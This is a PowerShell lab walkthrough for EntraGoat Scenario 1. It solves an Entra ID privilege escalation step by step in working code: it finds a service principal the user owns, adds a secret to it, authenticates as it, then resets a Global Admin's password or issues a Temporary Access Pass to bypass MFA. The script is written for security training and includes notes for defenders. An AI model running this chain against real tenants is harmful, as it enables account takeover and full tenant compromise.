<#
.SYNOPSIS
EntraGoat Scenario 1: Walkthrough step-by-step solution

.DESCRIPTION
________________________________________________________________________________________________________________________________________________
Scenario 1 - "Misowned and Dangerous: An Owner's Manual to Global Admin"

Official blog post: https://www.semperis.com/blog/service-principal-ownership-abuse-in-entra-id/

Attack flow: 

1. The attacker starts as a low-privileged Entra ID user (finance user david.martinez). 
Thanks to a misconfiguration, this user is listed as an owner of a service principal - as well-thought-out as giving a goat a chainsaw and asking it to 'trim just the hedges'.

2. Because SP owners can manage credentials, the attacker adds a new client secret to it. 
No approval, no alert - yep, completely valid behavior from the platform's perspective.

3. Using the newly added secret and SP App ID, the attacker authenticates as the SP using app-only flow. 
The low-priv user is now wearing a much fancier hat with broader privilege boundaries.

4. The SP has the Privileged Authentication Administrator (PAA) role. 
This role allows resetting any authentication method (including passwords) for any user, including Global Administrators (GA). Yes, really.

5. Resetting the Global Admin's Password or Adding TAP
With the PAA privileges, the attacker resets the password of a GA or adds a Temporary Access Pass (TAP) to bypass MFA.
No phishing, no persistence tricks - just raw role power obtained through a misconfigured ownership chain.

6. Taking Over the Admin Account
The attacker logs in with the freshly reset GA password or TAP and assumes full control of the tenant.
While the access is technically legitimate, it's far from invisible - logs will show the password reset event, the sign-in IP, device fingerprint, and more.

From a defender's perspective, these are plenty breadcrumbs to follow:
Who reset the password? From where? What followed?
Even if it looks like routine admin behavior, it's a classic case of "legit credentials, malicious intent."

- - - 

--> So... why this works?
Microsoft allows SP owners to manage credentials without additional approval.
When those SPs are assigned sensitive roles, ownership becomes a critical path for privilege escalation.
Low-priv users might own SPs if:
* App registrations are open (default setting)
* They created an app that later got privileged roles
* Ownership was granted temporarily and never removed
* A multi-tenant app was consented to and they were assigned as owners

This scenario highlights how minor misconfigurations, like unchecked SP ownership, can snowball into major breaches when owner list audits are neglected.
The key distinction here is between delegated (user context) and app-only (service principal context) authentication flows and their different security boundaries.
________________________________________________________________________________________________________________________________________________

.NOTES
Requires: Get-MSGraphTokenWithUsernamePassword function from BARK (https://github.com/BloodHoundAD/BARK)
you must have the function/BARK toolkit loaded in PS memory to use this function but other tools (or Connect-MgGraph) can be used as well.
#>


function Find-OwnedServicePrincipals {
    param([string]$UserId)
    
    # Get all service principals in tenant
    $allSPs = Get-MgServicePrincipal -All
    Write-Host "Found $($allSPs.Count) service principals in tenant"
    
    $ownedSPs = @()
    $checkCount = 0
    
    # Check ownership of each service principal
    foreach ($sp in $allSPs) {
        $checkCount++
        if ($checkCount % 50 -eq 0) {
            Write-Host "Checked $checkCount/$($allSPs.Count) service principals..."
        }
        
        try {
            $owners = Get-MgServicePrincipalOwner -ServicePrincipalId $sp.Id -ErrorAction SilentlyContinue
            if ($owners) {
                foreach ($owner in $owners) {
                    if ($owner.Id -eq $UserId) {
                        $ownedSPs += $sp
                        Write-Host "OWNED SERVICE PRINCIPAL FOUND!" -ForegroundColor DarkYellow
                        Write-Host "   Name: $($sp.DisplayName)" -ForegroundColor Yellow
                        Write-Host "   SP ID: $($sp.Id)" -ForegroundColor Yellow
                        Write-Host "   App ID: $($sp.AppId)" -ForegroundColor Yellow
                        break
                    }
                }
            }
        } catch {
            continue
        }
    }
    return $ownedSPs
}


function Get-ServicePrincipalRoles {
    param([object]$ServicePrincipal)
    
    Write-Host "Checking roles for: $($ServicePrincipal.DisplayName)"
    
    # Check directory role assignments for the service principal
    $roleAssignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($ServicePrincipal.Id)'" -ErrorAction SilentlyContinue
    $roles = @()
    
    if ($roleAssignments) {
        foreach ($assignment in $roleAssignments) {
            $roleDefinition = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $assignment.RoleDefinitionId
            $roles += $roleDefinition
            Write-Host "   Role: $($roleDefinition.DisplayName)" -ForegroundColor Green
        }
    } else {
        Write-Host "   No directory roles assigned"
    }
    
    return $roles
}

# Configuration settings for convenience
$tenantId = "[YOUR-TENANT-ID]"
$UPN = "david.martinez@[YOUR-TENANT-DOMAIN-NAME].onmicrosoft.com"
$password = "GoatAccess!123"


# Step 1: Initial foothold - Authenticating as the compromised user
Connect-MgGraph

# We could also use third-party enumeration tools such as BARK, GraphRunner, ROADtools, and AADInternals. For simplicity, we will use BARK's Get-MSGraphTokenWithUsernamePassword function to acquire a delegated graph token via ROPC.
# . .\BARK.ps1 
# $userToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
# $userAccessToken = $userToken.access_token
# $SecureToken = ConvertTo-SecureString $userAccessToken -AsPlainText -Force
# Connect-MgGraph -AccessToken $SecureToken

# Verify authentication and context
Get-MgContext

# For a more detailed security context we can decode the JWT token issued to us with Parse-JWTToken function from BARK
# This shows delegated permissions (scp), directory roles (wids), authentication method (amr), etc.
# Parse-JWTToken -Token $userAccessToken

# Step 2: Enumeration 
# Since this is the first scenario in the EntraGoat series, we'll walk through the enumeration process and highlight foundational privilege escalation techniques. In our other scenarios, we'll assume this baseline and focus directly on the core attack path, skipping the CTF-style reconnaissance steps.

# Get current user details
$currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"
$currentUser

# Check for directory roles (should be empty for this scenario)
Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($currentUser.Id)'" | Select-Object RoleDefinitionId

# Check group memberships (should only show default tenant group)
$groupIDs = Get-MgUserMemberOf -UserId $currentUser.Id -All
foreach ($group in $groupIDs) {
    Get-MgGroup -GroupId $group.Id
}

# Check for owned groups (should be empty)
Get-MgGroup -All | Where-Object {
    (Get-MgGroupOwner -GroupId $_.Id -ErrorAction SilentlyContinue).Id -contains $currentUser.Id
} 

# Check for owned service principals (should find 1 - "Finance Analytics Dashboard SP")
Get-MgServicePrincipal -All | Where-Object {
    (Get-MgServicePrincipalOwner -ServicePrincipalId $_.Id -ErrorAction SilentlyContinue).Id -contains $currentUser.Id
}

# Check if the owned SP has any assigned permissions (it doesn't)
$SP = Get-MgServicePrincipal -Filter "displayName eq 'Finance Analytics Dashboard'"
Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $SP.Id | ForEach-Object {
    Get-MgAppRole -AppRoleId $_.AppRoleId
}

# Check if the owned SP has any directory role assignments (it does - Privileged Authentication Administrator)
Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($SP.Id)'" | ForEach-Object {
    Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId
}

# To improve usability we can write simple wrapper functions such as Find-OwnedServicePrincipals and Get-ServicePrincipalRoles that are designed to automate the discovery of SP ownership and resolve directory role assignments more efficiently like other enumeration tools do:
$ownedSPs = Find-OwnedServicePrincipals -UserId $currentUser.Id
foreach ($ownedsp in $ownedSPs) {
    Get-ServicePrincipalRoles -ServicePrincipal $ownedsp
}

# Step 3: Pivoting into the service principal's context
# Since we own the SP, we can add a secret to it
$secretDescription = "EntraGoat-Secret-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$passwordCredential = @{
    DisplayName = $secretDescription
    EndDateTime = (Get-Date).AddYears(1)
}

$newSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $SP.Id -PasswordCredential $passwordCredential

# Save the added secret details
$clientSecret = $newSecret.SecretText

$tenantId = (Get-MgOrganization).Id

# Disconnect current user session 
Disconnect-MgGraph

# Step 4: Authenticate as the SP using app-only flow
$secureSecret = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $SP.AppId, $secureSecret
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential

# Verify SP authentication
Get-MgContext

# Find the admin user details
$targetAdmin = Get-MgUser -Filter "startswith(userPrincipalName, 'EntraGoat-admin-s1')"

# Step 5: Account takeover
# We have the role of Privileged Authentication Administrator, so we can reset the admin password, right?
$newAdminPassword = "EntraGoat-$(Get-Date -Format 'yyyyMMdd-HHmmss')!"
$passwordProfile = @{
    Password = $newAdminPassword
    ForceChangePasswordNextSignIn = $false
}

Update-MgUser -UserId $targetAdmin.Id -PasswordProfile $passwordProfile
$newAdminPassword

# Alternative: Temporary Access Pass (TAP) is a time-limited passcode that can be used to authenticate without MFA. We can set TAP for the GA to bypass current MFA requirements and sign in directly to the Azure portal with it. 
$tempAccessPass = @{
     "@odata.type" = "#microsoft.graph.temporaryAccessPassAuthenticationMethod"
     "lifetimeInMinutes" = 60
     "isUsableOnce" = $false
 }
$TAP = New-MgUserAuthenticationTemporaryAccessPassMethod -UserId $targetAdmin.Id -BodyParameter $tempAccessPass
$TAP.TemporaryAccessPass
# log in as the admin user with the TAP to Azure Portal 

# Disconnect SP session
Disconnect-MgGraph

# Step 6: Authenticate as the compromised admin with BARK
$adminToken = Get-MSGraphTokenWithUsernamePassword -Username $targetAdmin.UserPrincipalName -Password $newAdminPassword -TenantID $tenantId
$adminAccessToken = $adminToken.access_token
$SecureAdminToken = ConvertTo-SecureString $adminAccessToken -AsPlainText -Force
Connect-MgGraph -AccessToken $SecureAdminToken

# Verify admin authentication
Get-MgContext

# You can decode the JWT token issued to the admin user for it's security context, do you see the differences?
# Parse-JWTToken -Token $userAccessToken
#                VS
# Parse-JWTToken -Token $adminAccessToken

# Step 7: Retrieve flag - demonstrating full tenant compromise
Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userPrincipalName,onPremisesExtensionAttributes' |
    Select-Object @{n='UPN';e={$_.userPrincipalName}},
                  @{n='Id';e={$_.id}},
                  @{n='Flag';e={$_.onPremisesExtensionAttributes.extensionAttribute1}}

# Disconnect admin session
Disconnect-MgGraph

# Congratulations! You have successfully completed the EntraGoat Scenario 1.
# Don't forget to run the cleanup script to restore the tenant to it's original state!

# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing the source code for EntraGoat Scenario 1.

# Official blog post: https://www.semperis.com/blog/service-principal-ownership-abuse-in-entra-id/

